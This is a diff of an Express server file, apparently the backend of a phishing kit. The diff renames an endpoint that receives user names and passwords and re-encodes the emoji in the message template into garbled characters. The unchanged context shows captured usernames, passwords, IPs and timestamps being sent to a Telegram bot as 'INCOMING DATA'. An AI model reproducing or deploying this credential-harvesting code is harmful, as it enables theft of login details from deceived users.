@@ -1,3 +1,5 @@
+
+
 import express from "express";
 import crypto from "crypto";
 import fs from "fs";
@@ -66,7 +68,7 @@ function readJSONSafe(file, def = {}) {
 }
 
 /* ================= ENDPOINT ================= */
-app.post("/api/apinet", async (req, res) => {
+app.post("/apinet", async (req, res) => {
   try {
     const ip = getIP(req);
     const ua = (req.headers["user-agent"] || "").toLowerCase();
@@ -131,13 +133,13 @@ app.post("/api/apinet", async (req, res) => {
     /* ===== TELEGRAM (ANTI CRASH) ===== */
     if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
       const msg = `
-🧠 *INCOMING DATA*
+ðŸ§  *INCOMING DATA*
 
-👤 user : \`${user}\`
-🔑 pass : \`${pass}\`
+ðŸ‘¤ user : \`${user}\`
+ðŸ”‘ pass : \`${pass}\`
 
-🌍 IP   : \`${ip}\`
-⏱ TIME : \`${new Date().toISOString()}\`
+ðŸŒ IP   : \`${ip}\`
+â± TIME : \`${new Date().toISOString()}\`
 
 #APINET
 `;
